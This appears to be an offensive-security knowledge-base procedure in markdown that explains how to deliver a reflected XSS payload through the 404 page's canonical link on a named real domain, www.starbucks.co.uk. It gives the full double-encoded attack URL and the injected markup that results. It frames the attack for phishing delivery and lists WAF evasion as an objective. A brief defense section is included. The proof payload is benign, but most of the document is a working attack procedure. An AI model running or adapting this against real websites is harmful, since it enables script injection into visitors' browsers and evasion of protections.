---
tags:
  - xss
  - reflected-xss
  - url-delivery
  - 404-injection
type: procedure
tools:
  - '[[tools/Firefox-Quantum]]'
tactics:
  - '[[Execution]]'
commands: []
verified: false
platforms:
  - Web
submitted: true
created_at: '2023-10-01T00:00:00Z'
techniques:
  - '[[JavaScript]]'
updated_at: '2025-12-13T23:55:06.140Z'
skill_level: intermediate
impact_level: high
detection_risk: medium
sub_techniques: []
id: 3f4af0fd-90e0-4d2d-a833-fe2fd1ffae18
validated: true
mitre_tactics:
  - '[[Execution]]'
mitre_techniques:
  - '[[JavaScript]]'
---
# Deliver-Reflected-XSS-Payload-via-404-URL

## Summary

This procedure delivers the double-encoded XSS payload by accessing a crafted URL on affected Starbucks domains, triggering the 404 page to reflect the injection into the canonical link tag without proper sanitization.

## Description

The vulnerability arises from the 404 handler directly inserting the unsanitized URL path into the href attribute of the canonical link. When the encoded payload is used in the path, it decodes partially on the server, allowing attribute injection like accesskey and onclick. This reflected XSS requires the victim to visit the URL, making it suitable for phishing or social engineering delivery.

## Requirements

1. Crafted double-encoded payload from prior procedure
2. Web browser like Firefox
3. Access to target domain (e.g., www.starbucks.co.uk)
4. HTTPS support for the domain

## Defense

Defensive measures and detection strategies:

- Sanitize all URL path parameters before HTML insertion, escaping quotes and attributes
- Deploy WAF rules to detect encoded payloads in 404 requests
- Log and alert on high volumes of 404s from suspicious IPs
- Use HTML entity encoding for dynamic content in attributes

## Objectives

1. Load the 404 page with reflected payload
2. Confirm injection in page source
3. Avoid WAF triggers during delivery

## Instructions

### Step 1: Assemble Full URL

**Context**: Combine the domain with the junk prefix and encoded injection.

No command; manually build:

https://www.starbucks.co.uk/htp8bi2zcg%2522%2520accesskey=%2527x%2527%2520onclick=%2527confirm%601%60%2527%2520//2injectiontrme47nbfq/blonde/bright-sky-blend/ground=1

> Replace with actual encoded payload; ensure it points to a non-existent path to hit 404.

### Step 2: Access URL in Browser

**Context**: Use Firefox to visit the URL, simulating victim navigation.

Open [[tools/Firefox-Quantum]] and navigate to the URL.

> Expected: 404 page loads; inspect element to see <link rel="canonical" href="https://www.starbucks.co.uk/htp8bi2zcg" accesskey='x' onclick='confirm`1`' //2injectiontrme47nbfq/blonde/bright-sky-blend/ground=1">

### Step 3: Verify Reflection

**Context**: Check page source for successful injection.

Right-click > View Page Source; search for 'accesskey'.

> Success if attributes appear outside the href value.

## MITRE ATT&CK Mapping

### Tactics

- [[Execution]]

### Techniques

- [[JavaScript]]

### Sub-Techniques


## Commands Used


## Tools Used

- [[tools/Firefox-Quantum]]

## Tags

- xss
- url-delivery
- 404-injection
